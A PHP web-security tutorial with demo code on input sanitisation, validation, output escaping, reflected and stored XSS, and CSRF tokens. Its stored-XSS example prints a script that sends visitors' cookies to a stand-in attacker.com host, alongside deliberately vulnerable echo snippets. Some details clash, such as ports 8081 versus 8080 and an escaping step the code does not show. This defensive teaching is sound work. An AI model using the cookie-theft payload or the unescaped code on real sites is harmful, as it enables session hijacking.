# Securing Input and Output Data

---

In order to protect your website's users and the website itself, you should protect your web applications from malicious input and operations. Application security is one of the pillars of a reliable application. This should not be overlooked — on the contrary, you must have security in mind **all the time** while developing an app.

Neglecting security creates **technical debt**: it puts your clients' data at risk, causes unpredictable application behavior, and leads to costly debugging. What starts as a small team shortcut becomes a serious liability the moment the product scales.

---

## Project Structure

```
/app
├── src/
│   ├── components/
│   │   └── Template.php        ← Loads and renders template files
│   └── templates/
│       ├── main.php            ← Base HTML layout (shared on every page)

│       └── search.php          ← Search form template (XSS demo)
└── web/
    └── index.php               ← Single entry point for all HTTP requests
```

> Start the built-in server from the project root (`/app`):
> ```bash
> # Recommended — serve from the web/ directory directly
> php -S 127.0.0.1:8081 -t web/
>
> # Or from inside the web/ directory
> cd web && php -S 127.0.0.1:8081
> ```
>
> > **Note:** The `-t web` flag tells PHP's built-in server to use `web/` as the document root, so `index.php` is found automatically. If you omit `-t web` and run from the project root instead, requests will not reach `web/index.php` correctly.

## Best Practices

### 1. Use a Single Entry Point

All HTTP requests go through one file — `web/index.php`. It bootstraps dependencies, starts the session, and routes the request to the right handler. This prevents any other script from being accessed directly via the browser.

### 2. Separate Business Logic from Presentation

Keep PHP processing in handler/controller files and HTML markup in template files under `src/templates/`. This makes the codebase easier to read, test, and secure.

### 3. Sanitize and Validate Input Early, Escape Output Late

- **Sanitize** — clean the input as soon as it arrives (remove unwanted characters)
- **Validate** — confirm the cleaned value meets your rules (correct type, range, format)
- **Escape** — transform data into a safe form at the moment it leaves the application (rendered into HTML)

### 4. Use Type Hinting

Declare parameter and return types on all functions. PHP throws a `TypeError` if the wrong type is passed.

```php
function getStudentById(int $id): array { /* ... */ }
```

### 5. Enable Strict Types

Add `declare(strict_types=1)` at the top of every file. This prevents PHP from silently coercing `"123abc"` into `123`.

```php
<?php
declare(strict_types=1);
```

### 6. Use Strict Comparison (`===`)

Loose comparison (`==`) causes `0 == false` and `"" == null` to evaluate as `TRUE`, which is a common source of bugs.

```php
// Dangerous — loose comparison
if ($error == false) { }   // true even when $error is 0 or ""

// Safe — strict comparison
if ($error === false) { }  // only true when $error is exactly boolean false
```

### 7. Split Code into Small, Focused Functions

Functions like `validateEmail()`, `sanitizeMessage()`, or `isWithinRange()` are easy to test and read. Avoid large functions that do too many things at once.

### 8. Never Use the `@` Error Suppression Operator

It silently swallows errors, making bugs invisible. Use a proper error handler and log errors instead.

## Sanitizing User Input

As soon as data arrives in a script it must be **sanitized** — potentially harmful content is removed or cleaned before any further processing.

### `filter_input()` — Sanitizing Directly from Superglobals

```php
// Syntax
filter_input(int $type, string $variable_name, int $filter, mixed $options);
```

| `$type` constant | Source superglobal |
|-----------------|-------------------|
| `INPUT_POST` | `$_POST` |
| `INPUT_GET` | `$_GET` |
| `INPUT_COOKIE` | `$_COOKIE` |
| `INPUT_SERVER` | `$_SERVER` |

**Return values:**

| Return value | Meaning |
|-------------|---------|
| `null` | The input key does not exist |
| `false` | The filter failed |
| scalar | The sanitized value |

```php
// Remove everything except digits and +/- signs
$stars = filter_input(INPUT_POST, 'stars', FILTER_SANITIZE_NUMBER_INT);

// Strip tags and encode special characters from a message
$message = filter_input(INPUT_POST, 'message', FILTER_SANITIZE_SPECIAL_CHARS);

// Always check the return value
if (null === $message) {
    echo "Message input was not submitted.";
} elseif (false === $message) {
    echo "Message failed sanitization.";
}
```

### Other Useful Sanitization Functions

```php
// Strip HTML/PHP tags entirely
strip_tags('Hello <script>alert(1)</script>!');
// → "Hello alert(1)!"

// Remove leading/trailing whitespace
trim('  hello  ');
// → "hello"
```

## Validating User Input

Validation checks that the sanitized value meets the rules your application expects.

### `filter_var()` — Validate a Variable

Unlike `filter_input()`, `filter_var()` accepts any variable as its first argument.

```php
// Approach 1 — simple integer cast and range check (preferred for brevity)
$stars = (int)$stars;
if ($stars < 1 || $stars > 5) {
    echo "Stars must be between 1 and 5.";
}

// Approach 2 — filter_var with min/max range and default
$stars = filter_var($stars, FILTER_VALIDATE_INT, [
    'options' => [
        'default'   => 0,  // returned when validation fails
        'min_range' => 1,
        'max_range' => 5,
    ]
]);
if ($stars === 0) {
    echo "Stars must be between 1 and 5.";
}

// Validate an email address
$email = filter_var($_POST['email'], FILTER_VALIDATE_EMAIL);
if ($email === false) {
    echo "Invalid email address.";
}

// Quick integer with null coalescing (common shorthand)
$page = (int)($_GET['page'] ?? 1);
```

### Other Useful Validation Functions

```php
is_numeric('42.5');                         // true
preg_match('/^\d{4}$/', $year);             // true — exactly 4 digits
in_array($major, ['CS', 'IT', 'DS'], true); // true if value is in the allowed list
```

## Escaping the Output

When sending data to the browser you must **escape** it — transform potentially harmful characters into safe HTML entities so the browser renders them as text, not as executable code.

### Cross-Site Scripting (XSS)

XSS is the most common web vulnerability. It lets attackers inject arbitrary HTML or JavaScript into your pages.

| Type | Description |
|------|-------------|
| **Reflected XSS** | Malicious code is returned immediately from user input (e.g., a search term echoed back to the page) |
| **Stored XSS** | Malicious code is saved to the database and executed for every visitor who views it |
| **DOM-based XSS** | Malicious code manipulates the browser's DOM without a server round-trip |

**Vulnerable example:**
```php
// User visits: /?s=<script>alert('hacked')</script>
echo sprintf('Search terms: %s', $_GET['s']);
// The browser executes the injected script!
```

**Fixed with `htmlentities()`:**
```php
echo sprintf('Search terms: %s', htmlentities($_GET['s'], ENT_QUOTES));
// Browser renders the HTML entities as plain visible text — harmless
```

**Special characters converted:**

| Character | HTML Entity |
|-----------|-------------|
| `&` | `&amp;` |
| `<` | `&lt;` |
| `>` | `&gt;` |
| `"` | `&quot;` |
| `'` | `&#039;` (only with `ENT_QUOTES`) |

> Always use `htmlentities($value, ENT_QUOTES)`. The `ENT_QUOTES` flag escapes both single and double quotes — essential when the value appears inside an HTML attribute.

```php
// Inside an HTML attribute — ENT_QUOTES is critical
<input type="text" value="<?= htmlentities($_POST['name'] ?? '', ENT_QUOTES) ?>">

// In the page body
<p>Welcome, <?= htmlentities($username, ENT_QUOTES) ?></p>
```

**Stored XSS example** — a malicious comment saved to a database:
```
Great post! <script>document.write('<img src="https://attacker.com/steal?c=' + document.cookie + '"/>');</script>
```
If rendered without escaping, this silently sends every visitor's session cookie to the attacker. Wrapping the output in `htmlentities()` renders it as plain visible text — completely harmless.

## Cross-Site Request Forgery (CSRF)

CSRF tricks an authenticated user's browser into submitting a forged request to your application (e.g., changing their email or making a purchase) by loading a hidden form on an attacker-controlled page.

**How it works:**
1. Attacker creates a hidden form on their site, pre-filled with malicious data
2. Victim (logged in to your app) visits the attacker's page
3. Browser automatically submits the form to your app using the victim's active session cookie
4. Your app processes it as a legitimate request

**The defence — CSRF Tokens:**

Generate a random token per session, embed it as a hidden field in every POST form, and verify it on submission. An attacker cannot know the token, so their forged request is rejected.

```php
// Step 1 — generate the token once per session (in web/index.php or a handler)
session_start();
if (!array_key_exists('csrf-token', $_SESSION)) {
    $_SESSION['csrf-token'] = bin2hex(random_bytes(32)); // 64-char hex string
}
```

```html
<!-- Step 2 — embed as a hidden field in every POST form -->
<form method="post" action="/register">
    <input type="hidden" name="csrf-token" value="<?= $_SESSION['csrf-token'] ?>">
    <!-- ...other fields... -->
    <button type="submit">Submit</button>
</form>
```

```php
// Step 3 — validate on every POST before processing
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!array_key_exists('csrf-token', $_POST)) {
        die('ERROR: CSRF token missing.');
    }
    if ($_POST['csrf-token'] !== $_SESSION['csrf-token']) {
        die('ERROR: CSRF token invalid.');
    }
    // Token is valid — safe to process the form
}
```

**Three outcomes:**

| Scenario | Result |
|----------|--------|
| Token not present in POST | Rejected — `array_key_exists` check fails |
| Token present but wrong value | Rejected — `!==` comparison fails |
| Token matches session value | Accepted — request proceeds |

### `src/components/Template.php`

```php
<?php
declare(strict_types=1);

namespace Components;

class Template
{
    public static string $viewsPath = __DIR__ . '/../templates';

    private string $name;

    public function __construct(string $name)
    {
        $this->name = $name;
    }

    private function getFilepath(): string
    {
        // Always use the .php extension — never a custom extension like .http-and-session
        return self::$viewsPath . DIRECTORY_SEPARATOR . $this->name . '.php';
    }

    public function render(array $data = []): string
    {
        extract($data, EXTR_OVERWRITE);
        ob_start();
        require $this->getFilepath();
        return (string) ob_get_clean();
    }
}
```

> **⚠️ Common Error — Wrong File Extension**
>
> A frequent mistake when adapting this template loader is accidentally using a non-standard extension such as `.http-and-session` instead of `.php`:
>
> ```php
> // ❌ Wrong — PHP cannot find or execute this file
> return self::$viewsPath . DIRECTORY_SEPARATOR . $this->name . '.http-and-session';
>
> // ✅ Correct — standard PHP file
> return self::$viewsPath . DIRECTORY_SEPARATOR . $this->name . '.php';
> ```
>
> `.http-and-session` is not a recognised PHP, Laravel, or any standard tool extension. Your template files on disk are always `.php` files (`main.php`, `search.php`, `sanitize-form.php`), so the extension in `getFilepath()` must match exactly.
>
> **If you see a file-not-found or `require` error**, the first thing to check is whether the extension returned by `getFilepath()` matches the actual files in `src/templates/`.

### `web/index.php`

```php
<?php
declare(strict_types=1);

require_once __DIR__ . '/../src/components/Template.php';

session_start();

// Generate CSRF token once per session
if (!array_key_exists('csrf-token', $_SESSION)) {
    $_SESSION['csrf-token'] = bin2hex(random_bytes(32));
}

$mainTemplate = new \Components\Template('main');
$templateData = ['title' => 'PHP Security Demo'];

// --- Router ---
$path = $_SERVER['PATH_INFO'] ?? '/';

switch ($path) {

    // --- Sanitization & Validation demo ---
    case '/sanitize':
        $templateData['title'] = 'Sanitize & Validate Demo';
        $errors         = [];
        $successMessage = null;
        $stars          = null;
        $message        = null;

        if ($_SERVER['REQUEST_METHOD'] === 'POST') {

            // 1. Validate CSRF token
            if (!array_key_exists('csrf-token', $_POST)
                || $_POST['csrf-token'] !== $_SESSION['csrf-token']) {
                die('ERROR: Invalid or missing CSRF token.');
            }

            // 2. Sanitize — remove unwanted characters
            $stars   = filter_input(INPUT_POST, 'stars',   FILTER_SANITIZE_NUMBER_INT);
            $message = filter_input(INPUT_POST, 'message', FILTER_SANITIZE_SPECIAL_CHARS);

            // 3. Validate — check that sanitized values meet the rules
            if (null === $stars || false === $stars) {
                $errors[] = "Stars input is missing or invalid.";
            } else {
                $stars = (int)$stars;
                if ($stars < 1 || $stars > 5) {
                    $errors[] = "Stars must be a number between 1 and 5.";
                }
            }

            if (null === $message) {
                $errors[] = "Message input is not set.";
            } elseif (false === $message) {
                $errors[] = "Message failed to pass the sanitization filter.";
            } elseif (strlen(trim($message)) < 10) {
                $errors[] = "Message must be at least 10 characters.";
            }

            if (empty($errors)) {
                $successMessage = sprintf(
                    'Feedback received! Stars: %d | Message: %s',
                    $stars,
                    $message
                );
            }
        }

        $templateData['content'] = (new \Components\Template('sanitize-form'))->render([
            'errors'         => $errors,
            'successMessage' => $successMessage,
            'stars'          => $stars,
            'message'        => $message,
        ]);
        break;

    // --- Reflected XSS / output escaping demo ---
    case '/search':
        $templateData['title']   = 'Search — XSS Demo';
        $templateData['content'] = (new \Components\Template('search'))->render();
        break;

    // --- Home page ---
    default:
        $templateData['content'] = '
            <h2>PHP Security Demo</h2>
            <p>Choose a demo from the navigation bar:</p>
            <ul>
                <li><a href="/sanitize">Sanitize &amp; Validate</a>
                    — input sanitization, validation, and CSRF protection</li>
                <li><a href="/search">XSS Demo</a>
                    — reflected XSS and output escaping with
                    <code>htmlentities()</code></li>
            </ul>';
        break;
}

echo $mainTemplate->render($templateData);
```

### Demo 1 — Feedback Form: Sanitization, Validation & CSRF

**URL:** `http://127.0.0.1:8080/sanitize`

When the form is first accessed, it displays two input fields: **Stars (1–5)** and **Message**. The demo is designed to let you intentionally enter bad data to observe how the application handles it.

---

#### What to Enter

| Field | Test Input |
|-------|-----------|
| Stars | `3a` |
| Message | `Hello <script>alert(1)</script>` |

---

#### What the Page Shows After Submission

```
Sanitized Values
Stars (sanitized):   3
Message (sanitized): 'Hello <script>alert(1)</script>'

Feedback received! Stars: 3 | Message: Hello &#60;script&#62;alert(1)&#60;/script&#62;
```

---

#### Step-by-Step Explanation

**Step 1 — Sanitization of the Stars Field**

The `stars` input uses `FILTER_SANITIZE_NUMBER_INT`, which keeps only digits and `+`/`-` signs and strips everything else.

```
Input entered:     3a
After sanitization: 3
```

The non-numeric character `a` is silently removed. Only the numeric portion `3` survives.

| User Input | Sanitized Value |
|-----------|----------------|
| `3a` | `3` |
| `4xyz` | `4` |
| `abc` | *(empty string — fails validation)* |

> **Sanitization** = cleaning input by removing or modifying unwanted characters.

---

**Step 2 — Sanitization of the Message Field**

The `message` input uses `FILTER_SANITIZE_SPECIAL_CHARS`, which encodes special characters. At the sanitization stage the raw value is preserved for display so you can see what was submitted:

```
Input:             Hello <script>alert(1)</script>
Sanitized display: 'Hello <script>alert(1)</script>'
```

The sanitized value is stored internally but not yet rendered into HTML — that happens at the output stage.

---

**Step 3 — Output Encoding to Prevent XSS**

When the success message is rendered into the HTML page, `htmlentities()` is applied to the message before it is inserted into the browser's output:

```
Stored value:   Hello <script>alert(1)</script>
Browser receives: Hello &#60;script&#62;alert(1)&#60;/script&#62;
```

The special characters are converted to HTML entities:

| Character | HTML Entity |
|-----------|------------|
| `<` | `&#60;` |
| `>` | `&#62;` |

So instead of the browser parsing `<script>alert(1)</script>` as an executable script element, it reads it as plain text and displays:

```
Hello <script>alert(1)</script>
```

No alert box appears. No JavaScript runs.

---

**Step 4 — Validation**

After sanitization, the cleaned `stars` value is checked against the allowed range:

```php
$stars = (int)$stars;  // "3" → 3
if ($stars < 1 || $stars > 5) {
    $errors[] = "Stars must be a number between 1 and 5.";
}
```

Since `3` is within `1–5`, validation passes and the form accepts the submission:

```
Feedback received! Stars: 3 | Message: Hello &#60;script&#62;alert(1)&#60;/script&#62;
```

> **Validation** = confirming that sanitized data meets the expected rules (type, range, format).

---

**Step 5 — CSRF Protection**

Every time the form page loads, a hidden field is embedded in the form containing the session token:

```html
<input type="hidden" name="csrf-token" value="a3f9...">
```

On POST, `web/index.php` checks the submitted token against the one stored in `$_SESSION` before any processing begins:

```php
if ($_POST['csrf-token'] !== $_SESSION['csrf-token']) {
    die('ERROR: CSRF token invalid.');
}
```

An attacker forging a request from another site cannot know this token, so their request is rejected before it can do any harm.

---

#### The Secure Workflow Illustrated

```
User Input  →  Sanitize  →  Validate  →  Process / Store  →  Encode Output  →  Browser
  "3a"            "3"         pass          stars = 3         "3"               displays 3
  "<script>"   "<script>"     pass        stored as-is     "&#60;script&#62;"   displays text
```

---

#### Summary Table

| Security Technique | Purpose | Example |
|-------------------|---------|---------|
| **Sanitization** | Remove or clean unwanted characters | `3a` → `3` |
| **Validation** | Confirm data meets requirements | Stars must be between 1 and 5 |
| **Output Encoding** | Prevent HTML/JavaScript execution in the browser | `<script>` → `&#60;script&#62;` |
| **CSRF Token** | Reject forged cross-site POST requests | Token mismatch → request blocked |

### Demo 2 — Search Page: Reflected XSS

**URL:** `http://127.0.0.1:8080/search`

This page demonstrates protection against **Reflected Cross-Site Scripting (Reflected XSS)** — the most common form of XSS on the web.

---

#### What is Reflected XSS?

Reflected XSS occurs when user input is taken from the request (usually a GET parameter) and immediately printed back into the page **without escaping**. The server "reflects" the input back to the browser, which then interprets it as HTML or JavaScript.

**Vulnerable code:**
```php
// User visits: /search?s=<script>alert('xss')</script>
echo "You searched for: " . $_GET['s'];
```

The browser receives:
```html
You searched for: <script>alert('xss')</script>
```

The browser parses the `<script>` tag and **executes** `alert('xss')`. A pop-up appears. An attacker can replace that harmless alert with code that steals session cookies, redirects the user, or logs keystrokes.

---

#### What to Enter

In the search box, type:

```
<script>alert('xss')</script>
```

---

#### What the Page Shows

```
You searched for: <script>alert('xss')</script>
```

No alert box appears. The text is displayed safely as plain characters.

---

#### What the Browser Actually Receives

The page's **"What the browser receives"** panel shows:

```html
You searched for: <strong>&lt;script&gt;alert(&#039;xss&#039;)&lt;/script&gt;</strong>
```

Every dangerous character has been converted to its HTML entity:

| Original Character | Escaped Version |
|-------------------|----------------|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `'` | `&#039;` |

So `<script>alert('xss')</script>` becomes:

```
&lt;script&gt;alert(&#039;xss&#039;)&lt;/script&gt;
```

The browser renders this as readable text — it never sees a `<script>` element, so nothing executes.

---

#### Why It Is Called "Reflected" XSS

The input is sent by the user and reflected immediately back in the response. Nothing is stored in a database. The attack lives entirely in the URL — which is why it is commonly delivered via a malicious link sent to a victim.

```
User sends request  →  Server reflects input back  →  Browser executes script
```

Unlike **Stored XSS**, where the malicious payload is saved and affects every future visitor, Reflected XSS requires the victim to click the crafted URL.

---

#### Secure vs. Insecure Comparison

**Insecure:**
```php
$search = $_GET['s'];
echo "You searched for: $search";
// Browser receives: You searched for: <script>alert('xss')</script>
// Result: JavaScript executes — alert box appears
```

**Secure:**
```php
$search = htmlentities($_GET['s'], ENT_QUOTES);
echo "You searched for: $search";
// Browser receives: You searched for: &lt;script&gt;alert(&#039;xss&#039;)&lt;/script&gt;
// Result: Displayed as plain text — nothing executes
```

The only difference is wrapping the output in `htmlentities()`. This single function call is the defence.

---

#### The Secure Process

```
User enters search term
         ↓
Server receives $_GET['s']
         ↓
htmlentities() escapes all special characters
         ↓
Safe text is inserted into the HTML response
         ↓
Browser renders plain text — no script executes
```

---

#### Summary Table

| Scenario | What the Browser Receives | What Happens |
|----------|--------------------------|--------------|
| **No escaping** | `<script>alert('xss')</script>` | Script executes — alert appears |
| **With `htmlentities()`** | `&lt;script&gt;alert(&#039;xss&#039;)&lt;/script&gt;` | Plain text displayed — nothing runs |

> The core rule: **never insert user-supplied data directly into HTML output.** Always pass it through `htmlentities($value, ENT_QUOTES)` first.

---

| Threat | Where it happens | Defence |
|--------|-----------------|---------|
| **XSS (Reflected)** | Echoing `$_GET`/`$_POST` directly into HTML | `htmlentities($value, ENT_QUOTES)` on all output |
| **XSS (Stored)** | Displaying database content in HTML | `htmlentities()` at render time |
| **CSRF** | Forged POST requests from another site | Generate + verify a session-bound CSRF token |
| **Type coercion bugs** | Loose `==` comparisons | `declare(strict_types=1)` + `===` strict comparison |
| **Unvalidated input** | Processing raw `$_POST`/`$_GET` | `filter_input()` to sanitize, `filter_var()` to validate |
